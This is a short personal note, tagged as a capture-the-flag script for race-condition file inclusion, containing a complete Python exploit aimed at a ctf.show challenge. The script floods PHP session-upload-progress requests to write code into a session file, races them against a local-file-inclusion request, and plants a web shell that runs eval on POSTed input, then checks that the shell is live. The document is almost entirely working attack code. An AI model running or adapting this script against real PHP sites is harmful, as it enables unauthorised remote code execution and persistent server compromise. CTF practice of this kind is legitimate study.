---
创建: 2025-12-01
tags:
  - CTF/脚本/条件竞争/文件包含
---

```python
import requests
import threading
import time

url = "http://eaef1f41-f1a0-4ef5-8e98-df2d7c9394ab.challenge.ctf.show/"
shell_name = "1.php"

f = open("./try.mp4", "rb")
upload_file = {"file": ("try.mp4", f)}
send_data = {
    "PHP_SESSION_UPLOAD_PROGRESS": (
        f"<?php file_put_contents('{shell_name}', '<?php eval($_POST[1]);?>');?>"
    )
}

sess_id = "fileInclude"
cookie_sess = {"PHPSESSID": sess_id}
include_path = "/tmp/sess_" + sess_id

stop = threading.Event()


def send():
    while not stop.is_set():
        requests.post(url, data=send_data, cookies=cookie_sess, files=upload_file)
    f.close()


def include():
    while not stop.is_set():
        requests.get(url + f"?file={include_path}")


def test():
    res = requests.get(url + shell_name)
    if res.status_code == 200:
        print("成功")
        print("等待所有线程结束...")
        stop.set()
        return True
    print(res.status_code)
    return False


for i in range(8):
    threading.Thread(target=send).start()
    threading.Thread(target=include).start()

while not test():
    time.sleep(1)
```
